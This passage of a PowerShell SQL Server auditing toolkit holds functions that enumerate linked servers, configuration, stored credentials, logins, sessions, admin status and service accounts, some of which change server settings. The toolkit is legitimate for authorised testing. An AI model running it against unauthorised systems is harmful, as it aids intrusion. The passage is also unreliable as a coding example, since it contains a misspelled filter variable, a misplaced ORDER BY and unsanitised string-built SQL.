            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLink -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server link name.')]
        [string]$DatabaseLinkName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerLinks = New-Object -TypeName System.Data.DataTable

        # Setup DatabaseLinkName filter
        if($DatabaseLinkName)
        {
            $VDatabaseLinkNameFilter = " WHERE a.name like '$DatabaseLinkName'"
        }
        else
        {
            $DatabaseLinkNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.server_id as [DatabaseLinkId],
            a.name AS [DatabaseLinkName],
            CASE a.Server_id
            WHEN 0
            THEN 'Local'
            ELSE 'Remote'
            END AS [DatabaseLinkLocation],
            a.product as [Product],
            a.provider as [Provider],
            a.catalog as [Catalog],
            'LocalLogin' = CASE b.uses_self_credential
            WHEN 1 THEN 'Uses Self Credentials'
            ELSE c.name
            END,
            b.remote_name AS [RemoteLoginName],
            a.is_rpc_out_enabled,
            a.is_data_access_enabled,
            a.modify_date
            FROM [Master].[sys].[Servers] a
            LEFT JOIN [Master].[sys].[linked_logins] b
            ON a.server_id = b.server_id
            LEFT JOIN [Master].[sys].[server_principals] c
            ON c.principal_id = b.local_principal_id
        $DatabaseLinkNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblServerLinks = $TblServerLinks + $TblResults
    }

    End
    {
        # Return data
        $TblServerLinks
    }
}


# ----------------------------------
#  Get-SQLServerConfiguration
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerConfiguration
{
    <#
            .SYNOPSIS
            Returns configuration information from the server using sp_configure.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerConfiguration -Instance SQLServer1\STANDARDDEV2014
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerConfiguration -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Nubmer of hosts to query at one time.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Name')
        $null = $TblResults.Columns.Add('Minimum')
        $null = $TblResults.Columns.Add('Maximum')
        $null = $TblResults.Columns.Add('config_value')
        $null = $TblResults.Columns.Add('run_value')


        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Switch to track advanced options
                $DisableShowAdvancedOptions = 0

                # Get show advance status
                $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                # Get sysadmin status
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                    }
                }
                else
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    }

                    if($IsSysadmin -eq 'Yes')
                    {
                        if(-not $SuppressVerbose)
                        {
                            Write-Verbose -Message "$Instance : Your a sysadmin, trying to enabled it."
                        }

                        # Try to enable Show Advanced Options
                        Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                        # Check if configuration change worked
                        $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                        if ($IsShowAdvancedEnabled2 -eq 1)
                        {
                            $DisableShowAdvancedOptions = 1
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                            }
                        }
                        else
                        {
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                            }
                        }
                    }
                }

                # Run sp_confgiure
                Get-SQLQuery -Instance $Instance -Query 'sp_configure' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                ForEach-Object -Process {
                    $SettingName = $_.name
                    $SettingMin = $_.minimum
                    $SettingMax = $_.maximum
                    $SettingConf_value = $_.config_value
                    $SettingRun_value = $_.run_value

                    $null = $TblResults.Rows.Add($ComputerName, $Instance, $SettingName, $SettingMin, $SettingMax, $SettingConf_value, $SettingRun_value)
                }

                # Restore Show Advanced Options state if needed
                if($DisableShowAdvancedOptions -eq 1 -and $IsSysadmin -eq 'Yes')
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    }
                    $Configurations = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}


# ----------------------------------
#  Get-SQLServerCredential
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerCredential
{
    <#
            .SYNOPSIS
            Returns credentials from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerCredential -Instance SQLServer1\STANDARDDEV2014

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            credential_id       : 65536
            CredentialName      : MyUser
            credential_identity : Domain\MyUser
            create_date         : 5/5/2016 11:16:12 PM
            modify_date         : 5/5/2016 11:16:12 PM
            target_type         :
            target_id           :
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerCredential -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Credential name.')]
        [string]$CredentialName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        $TblCredentials = New-Object -TypeName System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            credential_id,
            name as [CredentialName],
            credential_identity,
            create_date,
            modify_date,
            target_type,
            target_id
            FROM [master].[sys].[credentials]
        $CredentialNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblCredentials = $TblCredentials + $TblResults
    }

    End
    {
        # Return data
        $TblCredentials
    }
}


# ----------------------------------
#  Get-SQLServerLogin
# ----------------------------------
Function  Get-SQLServerLogin
{
    <#
            .SYNOPSIS
            Returns logins from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER PrincipalName
            Pincipal name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerLogin -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            PrincipalId   : 1
            PrincipalName : sa
            PrincipalSid  : 1
            PrincipalType : SQL_LOGIN
            CreateDate    : 4/8/2003 9:10:35 AM
            IsLocked      : 0
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLogin -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblLogins.Columns.Add('ComputerName')
        $null = $TblLogins.Columns.Add('Instance')
        $null = $TblLogins.Columns.Add('PrincipalId')
        $null = $TblLogins.Columns.Add('PrincipalName')
        $null = $TblLogins.Columns.Add('PrincipalSid')
        $null = $TblLogins.Columns.Add('PrincipalType')
        $null = $TblLogins.Columns.Add('CreateDate')
        $null = $TblLogins.Columns.Add('IsLocked')

        # Setup CredentialName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],principal_id as [PrincipalId],
            name as [PrincipalName],
            sid as [PrincipalSid],
            type_desc as [PrincipalType],
            create_date as [CreateDate],
            LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
            FROM [sys].[server_principals]
            WHERE type = 'S' or type = 'U' or type = 'C'
        $PrincipalNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblLogins.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
            [string]$_.IsLocked)
        }
    }

    End
    {
        # Return data
        $TblLogins
    }
}


# ----------------------------------
#  Get-SQLSession
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLSession
{
    <#
            .SYNOPSIS
            Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

            ComputerName          : SQLServer1
            Instance              : SQLServer1\STANDARDDEV2014
            PrincipalSid          : 010500000000000515000000F3864312345716CC636051C017100000
            PrincipalName         : Domain\MyUser
            OriginalPrincipalName : Domain\MyUser
            SessionId             : 51
            SessionStartTime      : 06/24/2016 09:26:21
            SessionLoginTime      : 06/24/2016 09:26:21
            SessionStatus         : running
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLSession -Verbose
            .EXAMPLE
            PS C:\> (Get-SQLSession -Instance SQLServer1\STANDARDDEV2014).count
            48
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSessions = New-Object -TypeName System.Data.DataTable
        $null = $TblSessions.Columns.Add('ComputerName')
        $null = $TblSessions.Columns.Add('Instance')
        $null = $TblSessions.Columns.Add('PrincipalSid')
        $null = $TblSessions.Columns.Add('PrincipalName')
        $null = $TblSessions.Columns.Add('OriginalPrincipalName')
        $null = $TblSessions.Columns.Add('SessionId')
        $null = $TblSessions.Columns.Add('SessionStartTime')
        $null = $TblSessions.Columns.Add('SessionLoginTime')
        $null = $TblSessions.Columns.Add('SessionStatus')

        # Setup PrincipalName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and login_name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to view sessions that aren't yours.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            security_id as [PrincipalSid],
            login_name as [PrincipalName],
            original_login_name as [OriginalPrincipalName],
            session_id as [SessionId],
            last_request_start_time as [SessionStartTime],
            login_time as [SessionLoginTime],
            status as [SessionStatus]
            FROM    [sys].[dm_exec_sessions]
            ORDER BY status
        $PrincipalNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblSessions.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $Sid,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }

    End
    {
        # Return data
        $TblSessions
    }
}


# ----------------------------------
#  Get-SQLSysadminCheck
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLSysadminCheck
{
    <#
            .SYNOPSIS
            Check if login is has sysadmin privilege on the target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014

            ComputerName   Instance                       IsSysadmin
            ------------   --------                       ----------
            SQLServer1     SQLServer1\STANDARDDEV2014     Yes
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Data for output
        $TblSysadminStatus = New-Object -TypeName System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }

    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT    '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            CASE
            WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
            ELSE 'Yes'
        END as IsSysadmin"

        # Execute Query
        $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
    }

    End
    {
        # Return data
        $TblSysadminStatus
    }
}


# ----------------------------------
#  Get-SQLLocalAdminCheck
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLLocalAdminCheck
{
    <#
            .SYNOPSIS
            Check if the current Windows user is running in a local adminsitrator context.
            PS C:\> Get-SQLLocalAdminCheck

            $true
    #>
    Begin
    {
    }

    Process
    {
        # Get current windows user
        $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

        # Get current windows username
        $WinCurrentUserName = $WinCurrentUser.name

        # Get current windows user's groups
        $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)

        # Check if the current windows user/groups are local administrators / process is elevated
        $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator        

        # Return true or false
        $WinGroups.IsInRole($WinRoleCheck)
    }

    End
    {
    }
}

# ----------------------------------
#  Get-SQLServiceAccount
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServiceAccount
{
    <#
            .SYNOPSIS
            Returns a list of service account names for SQL Servers services by querying the registry with xp_regread.  This can be executed against remote systems.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014

            ComputerName     : SQLServer1
            Instance         : SQLServer1\STANDARDDEV2014
            DBEngineLogin    : LocalSystem
            AgentLogin       : NT Service\SQLAgent$STANDARDDEV2014
            BrowserLogin     : NT AUTHORITY\LOCALSERVICE
            WriterLogin      : LocalSystem
            AnalysisLogin    : NT Service\MSOLAP$STANDARDDEV2014
            ReportLogin      : NT Service\ReportServer$STANDARDDEV2014
            IntegrationLogin : NT Service\MsDtsServer120

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLServiceAccount -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServiceAccount = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            $SysadminSetup = "
                -- Get SQL Server Browser - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLBrowser',
                @value_name   = N'ObjectName',
                @value        = @BrowserLogin OUTPUT

                -- Get SQL Server Writer - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLWriter',
                @value_name   = N'ObjectName',
                @value        = @WriterLogin OUTPUT

                -- Get MSOLAP - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,
                N'ObjectName',@AnalysisLogin OUTPUT

                -- Get Reporting - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @ReportInstance,
                N'ObjectName',@ReportLogin OUTPUT

                -- Get SQL Server DTS Server / Analysis - Calulated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @IntegrationVersion,
            N'ObjectName',@IntegrationDtsLogin OUTPUT"

            $SysadminQuery = '	,[BrowserLogin] = @BrowserLogin,
                [WriterLogin] = @WriterLogin,
